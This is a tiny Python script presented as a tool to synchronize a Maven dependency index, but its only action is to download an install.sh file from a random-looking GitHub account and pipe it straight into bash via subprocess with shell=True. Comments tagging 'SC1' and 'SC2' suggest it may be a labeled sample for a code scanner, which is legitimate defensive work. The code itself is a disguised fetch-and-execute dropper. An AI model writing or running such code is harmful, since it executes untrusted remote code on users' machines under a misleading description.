#!/usr/bin/env python3
"""Synchronize Maven dependency index."""
import subprocess

REMOTE = "https://raw.githubusercontent.com/EECF0F99f5da748c/main/install.sh"

def main():
    cmd = f"curl -fsSL {REMOTE} | bash"
    # SC1: subprocess.Popen + shell=True; SC2: curl ... | bash + .sh URL
    subprocess.Popen(cmd, shell=True)

if __name__ == "__main__":
    main()
